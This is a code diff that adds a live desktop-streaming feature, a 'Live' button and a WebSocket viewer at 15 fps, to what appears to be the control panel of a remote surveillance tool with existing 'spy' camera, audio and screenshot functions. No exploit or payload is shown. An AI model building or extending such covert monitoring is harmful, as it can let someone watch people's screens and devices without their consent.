@@ -4616,6 +4616,7 @@
               <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#fb923c" stroke-width="2" stroke-linecap="round" style="flex-shrink:0"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
               <select id="${tabId}-monitor-select" style="padding:3px 6px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);border-radius:5px;color:#e2e8f0;font-size:10px;min-width:0;flex:1;overflow:hidden;text-overflow:ellipsis"><option value="0">Loading...</option></select>
               <button id="${tabId}-ss-btn" onclick="spyScreenshot('${tabId}')" style="padding:3px 10px;border-radius:5px;border:1px solid rgba(251,146,60,.2);background:rgba(251,146,60,.1);color:#fb923c;cursor:pointer;font-size:10px;font-weight:600;white-space:nowrap;flex-shrink:0;display:flex;align-items:center;gap:4px"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>Capture</button>
+              <button id="${tabId}-live-btn" onclick="spyToggleLiveScreen('${tabId}')" style="padding:3px 10px;border-radius:5px;border:1px solid rgba(239,68,68,.2);background:rgba(239,68,68,.1);color:#ef4444;cursor:pointer;font-size:10px;font-weight:600;white-space:nowrap;flex-shrink:0;display:flex;align-items:center;gap:4px"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3" fill="currentColor"/></svg>Live</button>
             </div>
             <button onclick="spyLoadDevices('${tabId}')" style="padding:3px 8px;border-radius:5px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.04);color:rgba(255,255,255,.4);cursor:pointer;font-size:10px;display:flex;align-items:center;gap:3px;flex-shrink:0;transition:all .15s" onmouseenter="this.style.color='#e2e8f0';this.style.borderColor='rgba(255,255,255,.15)'" onmouseleave="this.style.color='rgba(255,255,255,.4)';this.style.borderColor='rgba(255,255,255,.08)'" title="Refresh device list"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 2v6h-6"/><path d="M3 12a9 9 0 0 1 15-6.7L21 8M3 22v-6h6"/><path d="M21 12a9 9 0 0 1-15 6.7L3 16"/></svg></button>
           </div>
@@ -4775,10 +4776,13 @@
         if (state) {
           if (state.camWs) state.camWs.close();
           if (state.camUrl) URL.revokeObjectURL(state.camUrl);
+          if (state.screenWs) state.screenWs.close();
+          if (state.screenUrl) URL.revokeObjectURL(state.screenUrl);
           if (state.audioWs) state.audioWs.close();
           if (state.audioCtx) state.audioCtx.close();
           if (state.vizAnim) cancelAnimationFrame(state.vizAnim);
           state.camActive = false;
+          state.screenActive = false;
           state.audioActive = false;
           delete _spyState[tabId];
         }
@@ -7091,6 +7095,70 @@
       const ts = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
       a.download = 'spy-capture-' + ts + '.jpg';
       a.click();
+    }
+
+    function spyToggleLiveScreen(tabId) {
+      const state = _spyState[tabId] || {};
+      const btn = document.getElementById(tabId + '-live-btn');
+      const feed = document.getElementById(tabId + '-cam-feed');
+      const placeholder = document.getElementById(tabId + '-cam-placeholder');
+      const rec = document.getElementById(tabId + '-cam-rec');
+      const fpsEl = document.getElementById(tabId + '-cam-fps');
+      const ctrl = document.getElementById(tabId + '-img-controls');
+      const zLabel = document.getElementById(tabId + '-zoom-label');
+      if (state.screenActive) {
+        // Stop
+        if (state.screenWs) { state.screenWs.close(); state.screenWs = null; }
+        if (state.screenUrl) { URL.revokeObjectURL(state.screenUrl); state.screenUrl = null; }
+        feed.src = '';
+        feed.style.display = 'none';
+        placeholder.style.display = 'flex';
+        rec.style.display = 'none';
+        if (fpsEl) fpsEl.style.display = 'none';
+        if (ctrl) ctrl.style.display = 'none';
+        if (zLabel) zLabel.style.display = 'none';
+        state.zoomLevel = 1; state.panX = 0; state.panY = 0;
+        feed.style.transform = '';
+        btn.innerHTML = '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3" fill="currentColor"/></svg>Live';
+        btn.style.color = '#ef4444'; btn.style.borderColor = 'rgba(239,68,68,.2)'; btn.style.background = 'rgba(239,68,68,.1)';
+        state.screenActive = false;
+      } else {
+        // Stop camera if active
+        if (state.camActive) spyToggleCamera(tabId);
+        // Start
+        const monSel = document.getElementById(tabId + '-monitor-select');
+        const monitor = monSel ? monSel.value : '0';
+        const ws = new WebSocket(_spyWsUrl('screen', 'desktop') + '&monitor=' + monitor + '&fps=15&quality=5');
+        ws.binaryType = 'blob';
+        let _fpsCount = 0, _fpsLast = performance.now();
+        ws.onmessage = (e) => {
+          if (state.screenUrl) URL.revokeObjectURL(state.screenUrl);
+          state.screenUrl = URL.createObjectURL(e.data);
+          feed.src = state.screenUrl;
+          _fpsCount++;
+          const now = performance.now();
+          if (now - _fpsLast >= 1000) {
+            if (fpsEl) fpsEl.textContent = _fpsCount + ' fps';
+            _fpsCount = 0; _fpsLast = now;
+          }
+        };
+        ws.onopen = () => {
+          feed.style.display = 'block';
+          placeholder.style.display = 'none';
+          rec.style.display = 'flex';
+          if (fpsEl) fpsEl.style.display = 'block';
+          if (ctrl) ctrl.style.display = 'flex';
+          if (zLabel) { zLabel.style.display = 'block'; zLabel.textContent = '100%'; }
+          state.zoomLevel = 1; state.panX = 0; state.panY = 0;
+          spyInitPan(tabId);
+        };
+        ws.onclose = () => { if (state.screenActive) spyToggleLiveScreen(tabId); };
+        state.screenWs = ws;
+        btn.innerHTML = '<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="6" y="6" width="12" height="12" rx="1" fill="currentColor"/></svg>Stop';
+        btn.style.color = '#fbbf24'; btn.style.borderColor = 'rgba(251,191,36,.2)'; btn.style.background = 'rgba(251,191,36,.1)';
+        state.screenActive = true;
+      }
+      _spyState[tabId] = state;
     }
 
     function spySetVolume(tabId, val) {
